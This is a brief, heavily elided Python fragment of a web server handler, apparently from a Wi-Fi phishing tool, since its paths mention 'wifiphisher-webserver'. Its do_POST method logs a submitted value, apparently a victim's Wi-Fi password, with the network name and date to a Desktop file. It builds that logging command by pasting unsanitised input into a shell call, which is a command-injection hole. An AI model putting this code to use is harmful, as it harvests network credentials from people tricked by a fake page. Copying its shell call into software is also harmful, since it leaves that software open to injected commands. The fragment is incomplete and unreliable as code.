...
class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ...
    def do_POST(self):
		...
		wifi_webserver_tmp2 = dir_path+os.path.sep+"/wifiphisher-webserver2"
                ...
                subprocess.call("echo \"$(date);"+essid+";p="+item.value+"\" | tee -a ~/Desktop/NOTEW",shell=True)
                ##date +%y%m%d%H%M%S
...
def serve_template(t,e):
    global template,essid
    template = t
    essid=e
